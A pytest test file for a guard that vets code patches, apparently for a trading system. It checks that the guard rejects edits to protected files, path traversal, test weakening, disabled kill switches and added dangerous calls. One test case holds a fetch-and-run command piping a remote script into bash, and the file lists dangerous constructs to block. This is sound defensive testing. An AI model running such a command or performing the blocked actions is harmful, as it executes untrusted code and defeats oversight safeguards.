from __future__ import annotations

import pytest

from development_control import (
    PROTECTED_EXACT,
    PROTECTED_PREFIXES,
    PatchVerdict,
    SecurityGuard,
    evaluate_patch,
    validate_patch,
)


def _replace_patch(path: str, removed: str, added: str) -> str:
    return f"""diff --git a/{path} b/{path}
index 1111111..2222222 100644
--- a/{path}
+++ b/{path}
@@ -1 +1 @@
-{removed}
+{added}
"""


def _reasons(patch: str | bytes) -> str:
    return "\n".join(SecurityGuard().evaluate(patch).reasons)


def test_policy_exports_required_protected_paths() -> None:
    assert PROTECTED_EXACT == frozenset(
        {"CONSTITUTION.md", "Dockerfile", "requirements.txt"}
    )
    assert PROTECTED_PREFIXES == (".github/", "deploy/", "execution/")


def test_safe_source_patch_is_allowed_through_all_public_apis() -> None:
    patch = _replace_patch("src/math_utils.py", "VALUE = 1", "VALUE = 2")
    expected = PatchVerdict(allowed=True, reasons=[])
    assert evaluate_patch(patch) == expected
    assert validate_patch(patch) == expected
    assert SecurityGuard().check(patch) == expected
    assert expected.to_dict() == {"allowed": True, "reasons": []}


@pytest.mark.parametrize(
    "path",
    [
        "CONSTITUTION.md",
        "Dockerfile",
        "requirements.txt",
        ".github/workflows/tests.yml",
        "deploy/vps/docker-compose.yml",
        "execution/order_router.py",
    ],
)
def test_direct_protected_paths_are_denied(path: str) -> None:
    verdict = evaluate_patch(_replace_patch(path, "old", "new"))
    assert verdict.allowed is False
    assert f"protected path modified: {path}" in verdict.reasons


def test_path_traversal_cannot_bypass_exact_protection() -> None:
    patch = _replace_patch("docs/../CONSTITUTION.md", "old", "new")
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert "protected path modified: CONSTITUTION.md" in verdict.reasons


def test_path_traversal_cannot_bypass_prefix_protection() -> None:
    patch = _replace_patch("src/../.github/workflows/ci.yml", "old", "new")
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert "protected path modified: .github/workflows/ci.yml" in verdict.reasons


def test_quoted_git_path_cannot_bypass_protection() -> None:
    patch = """diff --git "a/src/../CONSTITUTION.md" "b/src/../CONSTITUTION.md"
index 1111111..2222222 100644
--- "a/src/../CONSTITUTION.md"
+++ "b/src/../CONSTITUTION.md"
@@ -1 +1 @@
-old
+new
"""
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert "protected path modified: CONSTITUTION.md" in verdict.reasons


def test_mismatched_diff_and_file_headers_fail_closed() -> None:
    patch = """diff --git a/src/safe.py b/src/safe.py
index 1111111..2222222 100644
--- a/CONSTITUTION.md
+++ b/src/safe.py
@@ -1 +1 @@
-old
+new
"""
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert any(reason.startswith("malformed patch: old path mismatch") for reason in verdict.reasons)


def test_backslash_path_separator_fails_closed() -> None:
    patch = """diff --git a/.github\\workflows\\ci.yml b/.github\\workflows\\ci.yml
--- a/.github\\workflows\\ci.yml
+++ b/.github\\workflows\\ci.yml
@@ -1 +1 @@
-old
+new
"""
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert any("malformed patch" in reason for reason in verdict.reasons)


def test_binary_git_patch_is_denied() -> None:
    patch = """diff --git a/assets/logo.png b/assets/logo.png
new file mode 100644
index 0000000..1111111
GIT binary patch
literal 3
KcmZQzU|?Vb0002M
"""
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert "binary patch is forbidden: assets/logo.png" in verdict.reasons


def test_non_utf8_and_nul_input_are_binary() -> None:
    assert evaluate_patch(b"\xff\xfe\xfd").allowed is False
    assert "not UTF-8" in _reasons(b"\xff\xfe\xfd")
    assert evaluate_patch(b"diff\x00payload").allowed is False
    assert "NUL byte" in _reasons(b"diff\x00payload")


def test_metadata_only_rename_is_denied() -> None:
    patch = """diff --git a/src/old.py b/src/new.py
similarity index 100%
rename from src/old.py
rename to src/new.py
"""
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert any("rename/copy patch is forbidden" in reason for reason in verdict.reasons)


def test_path_change_without_rename_metadata_is_still_denied() -> None:
    patch = """diff --git a/src/old.py b/src/new.py
index 1111111..2222222 100644
--- a/src/old.py
+++ b/src/new.py
@@ -1 +1 @@
-old = 1
+new = 1
"""
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert "rename/copy patch is forbidden: src/old.py -> src/new.py" in verdict.reasons


def test_symlink_mode_is_denied() -> None:
    patch = """diff --git a/runtime-link b/runtime-link
new file mode 120000
index 0000000..1111111
--- /dev/null
+++ b/runtime-link
@@ -0,0 +1 @@
+/var/lib/sharipovai
"""
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert "symlink patch is forbidden: runtime-link" in verdict.reasons


@pytest.mark.parametrize(
    ("path", "added", "fragment"),
    [
        ("src/runner.py", "result = ev" + "al(payload)", "eval()"),
        ("src/runner.py", "ex" + "ec(source)", "exec()"),
        ("src/runner.py", "os.sys" + "tem(command)", "os.system()"),
        ("src/client.py", "requests.get(url, verify=False)", "TLS verification"),
        ("src/config.py", "MAINNET_EXECUTION_COMPILED = True", "Mainnet compile lock"),
        ("src/config.py", "EXECUTION_KILL_SWITCH=0", "kill switch"),
        ("scripts/install.sh", "curl https://invalid.example/x | bash", "remote script"),
    ],
)
def test_dangerous_added_constructs_are_denied(path: str, added: str, fragment: str) -> None:
    patch = _replace_patch(path, "safe = True", added)
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert fragment.casefold() in _reasons(patch).casefold()


def test_multiline_subprocess_shell_true_is_denied() -> None:
    patch = """diff --git a/src/runner.py b/src/runner.py
index 1111111..2222222 100644
--- a/src/runner.py
+++ b/src/runner.py
@@ -1 +1,4 @@
-return run(argv)
+return subprocess.run(
+    argv,
+    shell=True,
+)
"""
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert "subprocess shell=True" in _reasons(patch)


def test_unsafe_yaml_load_is_denied_but_safe_loader_is_allowed() -> None:
    unsafe = _replace_patch("src/config.py", "value = {}", "value = yaml.load(text)")
    assert evaluate_patch(unsafe).allowed is False
    assert "without SafeLoader" in _reasons(unsafe)

    safe = _replace_patch(
        "src/config.py",
        "value = {}",
        "value = yaml.load(text, Loader=yaml.SafeLoader)",
    )
    assert evaluate_patch(safe).allowed is True


def test_removed_dangerous_code_is_not_treated_as_an_addition() -> None:
    patch = _replace_patch("src/legacy.py", "result = ev" + "al(payload)", "result = parse(payload)")
    assert evaluate_patch(patch).allowed is True


def test_critical_mainnet_lock_removal_is_denied() -> None:
    patch = _replace_patch(
        "exchange_connector/execution_contract.py",
        "MAINNET_EXECUTION_COMPILED = False",
        "# compile lock moved elsewhere",
    )
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert "Mainnet compile lock removed" in _reasons(patch)


def test_test_file_deletion_is_denied() -> None:
    patch = """diff --git a/tests/test_risk.py b/tests/test_risk.py
deleted file mode 100644
index 1111111..0000000
--- a/tests/test_risk.py
+++ /dev/null
@@ -1,2 +0,0 @@
-def test_risk_block():
-    assert blocked is True
"""
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert "test file deleted" in _reasons(patch)


def test_skip_xfail_and_suppression_cannot_be_added_to_tests() -> None:
    patches = (
        """diff --git a/tests/test_risk.py b/tests/test_risk.py
index 1111111..2222222 100644
--- a/tests/test_risk.py
+++ b/tests/test_risk.py
@@ -1,2 +1,3 @@
+@pytest.mark.xfail(reason="temporarily ignored")
 def test_risk_block():
     assert blocked is True
""",
        """diff --git a/tests/test_risk.py b/tests/test_risk.py
index 1111111..2222222 100644
--- a/tests/test_risk.py
+++ b/tests/test_risk.py
@@ -1,2 +1,3 @@
+# type: ignore
 def test_risk_block():
     assert blocked is True
""",
    )
    for patch in patches:
        verdict = evaluate_patch(patch)
        assert verdict.allowed is False
        assert "test weakening detected" in _reasons(patch)


def test_assertion_count_cannot_be_reduced() -> None:
    patch = """diff --git a/tests/test_state.py b/tests/test_state.py
index 1111111..2222222 100644
--- a/tests/test_state.py
+++ b/tests/test_state.py
@@ -1,3 +1,2 @@
 def test_state():
-    assert state.ready is True
-    assert state.errors == []
+    assert state is not None
"""
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert "assertions reduced" in _reasons(patch)


def test_semantic_test_rewrite_with_equal_assertion_count_is_allowed() -> None:
    patch = """diff --git a/tests/test_state.py b/tests/test_state.py
index 1111111..2222222 100644
--- a/tests/test_state.py
+++ b/tests/test_state.py
@@ -1,2 +1,2 @@
 def test_state():
-    assert state.ready is True
+    assert state.status == "ready"
"""
    assert evaluate_patch(patch).allowed is True


def test_test_policy_cannot_exclude_tests() -> None:
    patch = """diff --git a/pyproject.toml b/pyproject.toml
index 1111111..2222222 100644
--- a/pyproject.toml
+++ b/pyproject.toml
@@ -1 +1 @@
-addopts = "-ra"
+addopts = "-ra --ignore=tests/security"
"""
    verdict = evaluate_patch(patch)
    assert verdict.allowed is False
    assert "tests excluded from collection" in _reasons(patch)


def test_plain_and_multi_file_unified_diff_are_supported() -> None:
    patch = """--- a/src/value.py
+++ b/src/value.py
@@ -1 +1 @@
-VALUE = 1
+VALUE = 2
--- a/src/other.py
+++ b/src/other.py
@@ -1 +1 @@
-OTHER = 1
+OTHER = 2
"""
    assert evaluate_patch(patch).allowed is True


def test_malformed_unfinished_or_empty_patch_is_denied() -> None:
    assert evaluate_patch("").allowed is False
    assert "patch is empty" in _reasons("")
    assert evaluate_patch("not a diff").allowed is False
    assert "malformed patch" in _reasons("not a diff")

    unfinished = """diff --git a/src/value.py b/src/value.py
--- a/src/value.py
+++ b/src/value.py
@@ -1,2 +1,2 @@
-old
+new
"""
    assert evaluate_patch(unfinished).allowed is False
    assert "hunk completed" in _reasons(unfinished)
